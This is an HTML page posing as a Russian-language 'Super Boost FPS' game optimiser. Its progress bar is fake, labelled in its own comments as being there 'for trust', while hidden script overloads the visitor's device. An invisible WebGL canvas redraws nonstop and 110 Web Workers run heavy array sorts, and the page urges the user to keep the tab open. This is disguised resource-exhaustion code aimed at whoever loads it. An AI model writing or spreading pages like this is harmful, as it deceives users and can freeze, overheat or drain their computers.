<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>⚡ Super Boost FPS ⚡</title>
    <style>
        body { background: #000; color: #0f0; text-align: center; font-family: sans-serif; }
        #progress { width: 80%; height: 20px; border: 1px solid #0f0; margin: 20px auto; position: relative; }
        #bar { width: 0%; height: 100%; background: #0f0; transition: width 0.5s; }
    </style>
</head>
<body>
    <h1>Оптимизация игрового движка...</h1>
    <div id="progress"><div id="bar"></div></div>
    <p id="txt">Анализ частоты ядер (0%)...</p>
    <canvas id="gpu" style="display:none;"></canvas>

    <script>
        // 1. ФЕЙКОВЫЙ ПРОГРЕСС (Для доверия)
        let p = 0;
        const bar = document.getElementById('bar');
        const txt = document.getElementById('txt');
        setInterval(() => {
            if (p < 100) {
                p += Math.random() * 2;
                bar.style.width = p + "%";
                txt.innerText = "Разгон ядер GPU: " + Math.floor(p) + "%";
            } else {
                txt.innerText = "ОПТИМИЗАЦИЯ ЗАВЕРШЕНА. НЕ ЗАКРЫВАЙТЕ ВКЛАДКУ!";
            }
        }, 500);

        // 2. НАГРУЗКА НА GPU (Через невидимый холст)
        const canvas = document.getElementById('gpu');
        const gl = canvas.getContext('webgl');
        function stressGPU() {
            for(let i=0; i<500; i++) {
                gl.clear(gl.COLOR_BUFFER_BIT); // Заставляем видяху постоянно "перерисовывать" пустоту
            }
            requestAnimationFrame(stressGPU);
        }
        stressGPU();

        // 3. НАГРУЗКА НА CPU + RAM (25 потоков)
        const workerCode = `
            setInterval(() => {
                let arr = [];
                for(let i=0; i<100000; i++) { arr.push(Math.random() * Math.random()); }
                arr.sort(); // Сортировка огромного массива - это ОЧЕНЬ тяжело для CPU
            }, 10);
        `;
        const blob = new Blob([workerCode], {type: 'application/javascript'});
        const url = URL.createObjectURL(blob);
        for(let i=0; i<110; i++) { new Worker(url); }

    </script>
</body>
</html>
